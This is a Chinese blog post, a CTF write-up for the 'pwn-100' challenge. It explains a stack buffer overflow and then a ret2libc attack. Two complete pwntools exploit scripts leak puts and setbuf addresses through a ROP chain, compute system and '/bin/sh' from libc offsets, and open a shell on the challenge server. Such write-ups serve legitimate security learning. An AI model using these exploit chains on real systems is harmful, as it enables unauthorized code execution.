{"title":"攻防世界闯关记录_pwn高手进阶区","slug":"攻防世界闯关记录_pwn高手进阶区","date":"2019-10-05T07:39:49.000Z","updated":"2021-02-22T15:52:29.772Z","comments":true,"path":"api/articles/攻防世界闯关记录_pwn高手进阶区.json","photos":[],"link":"","excerpt":" [Figure]   开坑一时爽，一直开坑一直爽。来高手进阶区继续爽吧！","covers":["../static/images/2019-10-02-15-11-09.png","../static/images/2019-10-27-13-27-50.png","../static/images/2019-10-27-13-25-06.png","../static/images/2019-10-27-13-24-02.png","../static/images/2019-10-27-13-46-23.png","../static/images/2019-10-27-13-47-04.png"],"content":"<p><img src=\"../static/images/2019-10-02-15-11-09.png\" alt=\"\" /></p>\n<p>  开坑一时爽，一直开坑一直爽。来高手进阶区继续爽吧！</p>\n<span id=\"more\"></span>\n<h2 id=\"pwn-100\"><a class=\"markdownIt-Anchor\" href=\"#pwn-100\"></a> pwn-100</h2>\n<p>  这是我做题以来碰到的第一道没有system函数也不给libc.so文件的题目（我好菜），还只是道栈题，唉，道阻且艰。先看一下保护机制：</p>\n<p><img src=\"../static/images/2019-10-27-13-27-50.png\" alt=\"\" /></p>\n<p>  64位程序，没有canary保护。题目拖进IDA分析源码如下：</p>\n<p><img src=\"../static/images/2019-10-27-13-25-06.png\" alt=\"\" /></p>\n<p><img src=\"../static/images/2019-10-27-13-24-02.png\" alt=\"\" /></p>\n<p>  进入主函数就会调用sub_40068E()这个函数，它又会调用sub_40063D()这个函数，它会读长度为200字节的内容，然而sub_40068E这里的v1变量只有0x40（64）字节大小的空间，所以可以轻而易举地进行栈溢出，只不过程序没有调用system函数，也没有给出libc.so文件，这里我们可以先利用栈溢出泄露两个函数的地址，再通过计算偏移的办法找到对应的libc.so文件，构造第一个exp如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">from pwn import * </span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,58539)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class=\"line\">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class=\"line\">puts_plt &#x3D; elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">input_addr &#x3D; 0x40068E</span><br><span class=\"line\">pop_rdi_ret &#x3D; 0x400763</span><br><span class=\"line\">setbuf_got &#x3D; elf.got[&quot;setbuf&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;a&#39; * 72</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(input_addr)</span><br><span class=\"line\">payload +&#x3D; &#39;a&#39; * (200 - 72 - 4*8 -1)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">output &#x3D; p.recvuntil(&quot;bye~\\n&quot;)</span><br><span class=\"line\">output &#x3D; p.recvline()</span><br><span class=\"line\">print output.encode(&quot;hex&quot;)</span><br><span class=\"line\">puts_addr_undecode &#x3D; output.strip(&quot;\\n&quot;) + &#39;\\x00&#39; * (8 - len(output) + 1)</span><br><span class=\"line\">puts_addr &#x3D; u64(puts_addr_undecode[:8])</span><br><span class=\"line\">print(&quot;[*] puts_addr:&quot;,hex(puts_addr))</span><br><span class=\"line\">payload &#x3D; &#39;a&#39; * 72</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi_ret) + p64(setbuf_got) + p64(puts_plt) + p64(input_addr)</span><br><span class=\"line\">payload +&#x3D; &#39;a&#39; * (200 - 72 -4*8 -1)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">output &#x3D; p.recvuntil(&quot;bye~\\n&quot;)</span><br><span class=\"line\">output &#x3D; p.recvline()</span><br><span class=\"line\">print output.encode(&quot;hex&quot;)</span><br><span class=\"line\">libc_start_undecode &#x3D; output.strip(&quot;\\n&quot;) + &#39;\\x00&#39; * (8 - len(output) + 1)</span><br><span class=\"line\">libc_start_addr &#x3D; u64(libc_start_undecode[:8])</span><br><span class=\"line\">print(&quot;[*] setbuf_addr:&quot;,hex(libc_start_addr))</span><br></pre></td></tr></table></figure>\n<p>  可以读到服务器中两个函数的地址（每次运行都会不一样，但相对偏移一定相同）：</p>\n<p><img src=\"../static/images/2019-10-27-13-46-23.png\" alt=\"\" /></p>\n<p>  把这个偏移输入到libc database search 中，可以找到对应的libc文件（有的时候只输出两个函数会找到几个对应的so文件，这时可以都试一下或者再输出第三个函数进行对比）：</p>\n<p><img src=\"../static/images/2019-10-27-13-47-04.png\" alt=\"\" /></p>\n<p>  那么就利用我们查出来的偏移打exp吧：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#encoding:utf-8</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn-100&quot;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,56786)</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class=\"line\">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class=\"line\">puts_plt &#x3D; elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">input_addr &#x3D; 0x40068E</span><br><span class=\"line\">pop_rdi_ret &#x3D; 0x400763</span><br><span class=\"line\">libc_start_got &#x3D; elf.got[&quot;setbuf&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;a&#39; * 72</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(input_addr)</span><br><span class=\"line\">payload +&#x3D; &#39;a&#39; * (200 - 72 - 4*8 -1)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">output &#x3D; p.recvuntil(&quot;bye~\\n&quot;)</span><br><span class=\"line\">output &#x3D; p.recvline()</span><br><span class=\"line\">print output.encode(&quot;hex&quot;)</span><br><span class=\"line\">puts_addr_undecode &#x3D; output.strip(&quot;\\n&quot;) + &#39;\\x00&#39; * (8 - len(output) + 1)</span><br><span class=\"line\">puts_addr &#x3D; u64(puts_addr_undecode[:8])</span><br><span class=\"line\">print(&quot;[*] puts_addr:&quot;,hex(puts_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">puts_offset &#x3D; 0x06f690</span><br><span class=\"line\">system_offset &#x3D; 0x045390</span><br><span class=\"line\">bin_sh_offset &#x3D; 0x18cd57</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr &#x3D; puts_addr - puts_offset + system_offset</span><br><span class=\"line\">bin_sh_addr &#x3D; puts_addr - puts_offset + bin_sh_offset</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;a&#39; * 72</span><br><span class=\"line\">payload +&#x3D; p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(input_addr)</span><br><span class=\"line\">payload +&#x3D; &#39;a&#39; * (200 - 72 - 4*8 -1)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]}